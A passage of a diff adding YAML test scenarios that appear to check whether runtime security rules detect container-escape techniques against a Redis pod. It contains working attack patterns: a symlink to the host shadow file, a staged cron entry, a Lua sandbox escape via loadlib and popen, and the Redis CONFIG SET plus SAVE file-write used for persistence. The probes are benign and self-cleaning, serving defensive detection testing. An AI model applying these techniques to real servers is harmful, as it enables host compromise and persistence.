+  # then a cooperating process on the host (or another container sharing
+  # /tmp) reads the symlink, exfiltrating the host secret. R1010 fires when
+  # a symlink targets a sensitive path.
+  - name: escape-symlink-host-shadow
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /host-etc/shadow /host-tmp/shadow_symlink_$$ && ls -l /host-tmp/shadow_symlink_$$ && rm -f /host-tmp/shadow_symlink_$$ && echo symlink_done"]
+    successIndicators:
+      - responseContains: "symlink_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ln
+      - ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: redis
+        command: ln
+
+  # ── T1053.003 Cron Persistence: drop a cron file via writable host /tmp ───
+  # If /host-tmp is writable, an attacker can stage a cron payload in the
+  # shared host /tmp that root-owned host services (logrotate, tmpfiles.d)
+  # may pick up. We also write a "cron-style" file directly to test that
+  # writes to predictable persistence paths fire detection rules.
+  # Real-world: Muhstik drops cron entries this way.
+  - name: escape-cron-stage-host-tmp
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "echo '* * * * * root /bin/sh /tmp/.r 2>/dev/null' > /host-tmp/.bob_cron_probe_$$ && cat /host-tmp/.bob_cron_probe_$$ && rm -f /host-tmp/.bob_cron_probe_$$ && echo cron_stage_done"]
+    successIndicators:
+      - responseContains: "cron_stage_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: sh
+
+  # ── T1055.008 Ptrace Code Injection probe (CAP_SYS_PTRACE granted) ────────
+  # The deployment grants CAP_SYS_PTRACE. Without hostPID we can only ptrace
+  # processes in the redis pod's PID namespace, but reading /proc/1/maps
+  # works and proves the capability is dangerous. R0008 fires for procfs
+  # environment/maps reads.
+  - name: escape-ptrace-init-maps
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /proc/1/maps | head -3 && echo ptrace_maps_done"]
+    successIndicators:
+      - responseContains: "ptrace_maps_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+
+  # ── T1611 Process pivot from Lua sandbox (the "redis-server should NEVER
+  # spawn child processes" detection) ───────────────────────────────────────
+  # Redis-server normally runs single-threaded with no fork-exec. ANY exec
+  # from inside the redis container is anomalous and should fire R0001 even
+  # if the spawned binary itself looks innocuous. This proves the baseline
+  # tightly captures "redis-server is the only exec" and any pivot — Lua,
+  # CONFIG SET dir RDB write hijack, MODULE LOAD — surfaces immediately.
+  - name: escape-process-pivot-via-lua
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        -- Spawn /bin/true — the most innocuous binary possible.
+        -- Detection should fire purely because redis spawned ANY child.
+        local cmd = io_mod.popen("/bin/true 2>&1; echo pivot_done")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators:
+      - responseContains: "pivot_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+
+  # ── T1098.004 Persistence: RDB write to host-shared path ──────────────────
+  # Classic Redis persistence: CONFIG SET dir to a writable host-shared
+  # location (/host-tmp), CONFIG SET dbfilename to a payload-like name,
+  # then SAVE to drop the RDB file there. P2Pinfect and Redigo both use
+  # this against /var/spool/cron and /root/.ssh on misconfigured Redis.
+  # The CONFIG SETs themselves don't emit detections (they're protocol
+  # commands), but the SAVE writes a file to /host-tmp which fires R0002
+  # (file access anomaly) on the cross-namespace write.
+  - name: escape-rdb-write-host-tmp
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/host-tmp"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: escape-rdb-write-payload
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "bob_redis_persist_probe.rdb"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: escape-rdb-save-trigger
+    type: custom
+    redis:
+      command: ["SAVE"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # Cleanup the RDB write probe so /host-tmp doesn't accumulate stage files.
+  - name: escape-rdb-cleanup
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "rm -f /host-tmp/bob_redis_persist_probe.rdb && echo rdb_cleanup_done"]
+    successIndicators:
+      - responseContains: "rdb_cleanup_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: rm
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CLEANUP — Restore Redis CONFIG mutations (PR119 rabbit)
+  # CONFIG SET dir / dbfilename change persistent server state. Without
+  # restoration the changes leak into later test runs of the same suite,
+  # which is especially risky in shared CI environments. The defaults below
+  # match a stock Redis 7 image (/data and dump.rdb).
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: cleanup-config-restore-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/data"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: cleanup-config-restore-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "dump.rdb"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
